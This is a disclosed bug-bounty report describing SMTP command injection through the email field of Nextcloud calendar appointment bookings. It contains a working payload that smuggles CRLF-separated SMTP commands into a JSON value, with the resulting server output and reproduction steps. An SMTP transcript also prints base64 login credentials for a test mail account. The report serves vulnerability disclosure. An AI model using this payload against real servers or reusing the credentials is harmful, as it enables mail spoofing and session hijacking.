# SMTP Command Injection in Appointment Emails via Newlines

## Report Details
- **Report ID**: 1509216
- **URL**: https://hackerone.com/reports/1509216
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-03-13T12:24:28.455Z
- **Disclosed**: 2022-12-27T17:29:26.072Z

## Reporter
- **Username**: spaceraccoon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
Users can create appointment calendars for other users to book slots on their calendar. When booking a slot, the following request is made:

```
POST /apps/calendar/appointment/1/book HTTP/2
Host: 192.168.92.132

{"start":1647306900,"end":"1647307200","displayName":"Test User","email":"<BOOKING USER'S EMAIL>","description":"Please accept!\r\n","timeZone":"Asia/Singapore"}
```

Next, a confirmation email with a confirmation link is sent to the user who booked the slot via `/var/www/nextcloud/apps/calendar/lib/Service/Appointments/BookingService.php` using the SMTP connection.

The SMTP connection involves the following messages:

```
EHLO nextcloud40gb
250-smtp.gmail.com at your service, [116.89.6.224]
250-SIZE 35882577
250-8BITMIME
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-CHUNKING
250 SMTPUTF8
STARTTLS
220 2.0.0 Ready to start TLS
EHLO nextcloud40gb
250-smtp.gmail.com at your service, [116.89.6.224]
250-SIZE 35882577
250-8BITMIME
250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-CHUNKING
250 SMTPUTF8
AUTH LOGIN
334 VXNlcm5hbWU6
aGFja2Vyb25ldGVzdDEyMzRAZ21haWwuY29t
334 UGFzc3dvcmQ6
ZHZob3Z1a3h0aWJrd2JhYg==
235 2.7.0 Accepted
MAIL FROM:<hackeronetest1234@gmail.com>
RCPT TO:<BOOKING USER'S EMAIL>
DATA
250 2.1.0 OK u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp
250 2.1.5 OK u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp
354  Go ahead u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp

.
250 2.0.0 OK  1647162315 u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp
QUIT
221 2.0.0 closing connection u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp
```

Unfortunately, as newlines and special characters are not sanitized in the `email` value in the JSON request, a malicious attacker can inject newlines to break out of the `RCPT TO:<BOOKING USER'S EMAIL>` SMTP command and begin injecting arbitrary SMTP commands. Using several properties of the email RFC, an attacker can craft a payload that passes both the PHP validation of the email and the SwiftMail injection. These commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.

For example, an attacker can inject a simple `EHLO a` command to view information about the backend server:

```
{"start":1647306900,"end":"1647307200","displayName":"Test User\r\n","email":"\">\r\nEHLO a\r\nRCPT TO:<a@a.com>\"@b.com","description":"Please accept!\r\n","timeZone":"Asia/Singapore"}
```

Which for Gmail would return:

```
{"status":"error","message":"Could not send mail: Expected response code 354 but got code \"250\", with message \"250-smtp.gmail.com at your service, [116.89.6.224]\r\n250-SIZE 35882577\r\n250-8BITMIME\r\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\r\n250-ENHANCEDSTATUSCODES\r\n250-PIPELINING\r\n250-CHUNKING\r\n250 SMTPUTF8\r\n\"","data":{"type":"OCA\\Calendar\\Exception\\ServiceException","message":"Could not send mail: Expected response code 354 but got code \"250\", with message \"250-smtp.gmail.com at your service, [116.89.6.224]\r\n250-SIZE 35882577\r\n250-8BITMIME\r\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\r\n250-ENHANCEDSTATUSCODES\r\n250-PIPELINING\r\n250-CHUNKING\r\n250 SMTPUTF8\r\n\"","code":250,
```

This leaks the backend IP addresses, SMTP server data, and so on.

## Steps To Reproduce:

Note: Email sending should be set up in the admin settings.

  1. At https://<NEXTCLOUD IP>/apps/calendar, select the plus sign beside "Appointments" on the left sidebar and create an appointment calendar.
  2. As another user, go to the link to the appointment booking for that calendar.
  3. Fill up a booking and intercept the request. Change the `email` value to `"email":"\">\r\nEHLO a\r\nRCPT TO:<a@a.com>\"@b.com"`. This should inject an `EHLO` SMTP command which returns some debug information about the backend SMTP server.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

{F1653231}

## Impact

The impact varies based on which commands are supported by the backend SMTP server. However, the main risk here is that the attacker can then hijack an already-authenticated SMTP session and run arbitrary SMTP commands as the email user, such as sending emails to other users, changing the FROM user, and so on.

## Attachments
- nextcloud_injection.png
